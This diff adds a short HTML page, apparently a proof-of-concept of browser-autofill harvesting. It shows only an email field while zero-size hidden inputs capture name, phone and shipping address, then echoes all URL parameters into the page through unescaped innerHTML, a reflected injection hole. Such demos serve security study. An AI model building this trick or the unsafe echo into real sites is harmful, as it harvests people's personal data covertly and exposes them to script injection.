@@ -1,0 +1,49 @@
+<body>
+    <form>
+        <input class="hi" name="name" autocomplete="name" />
+        <input class="hi" name="phone" autocomplete="tel" />
+        <input class="hi" name="ship-address" required id="frmAddressS" autocomplete="shipping street-address">
+        <input class="hi" name="ship-city" required id="frmCityS" autocomplete="shipping locality">
+        <input class="hi" name="ship-state" required id="frmStateS" autocomplete="shipping region">
+        <input class="hi" name="ship-zip" required id="frmZipS" autocomplete="shipping postal-code">
+        <input class="hi" name="ship-country" required id="frmCountryS" autocomplete="shipping country">
+        <br>
+        <label>Emailを入力してください!</label>
+        <br>
+        <input name="email" autocomplete="email" />
+        <input type="submit" />
+    </form>
+</body>
+<script>
+function getParameterByName(name) {
+    var url = window.location.href;
+    var params = new URL(url).searchParams;
+    return params.get(name);
+}
+
+function add(name) {
+    var div = document.createElement('div');
+    div.innerHTML = name + ": " + getParameterByName(name);
+    document.body.appendChild(div);
+}
+
+if (getParameterByName("email")) {
+    add("name");
+    add("email");
+    add("phone");
+    add("ship-address");
+    add("ship-city");
+    add("ship-state");
+    add("ship-zip");
+    add("ship-country");
+}
+
+</script>
+<style>
+.hi {
+    width: 0px;
+    height: 0px;
+    border: 0px;
+    padding: 0px;
+}
+</style>
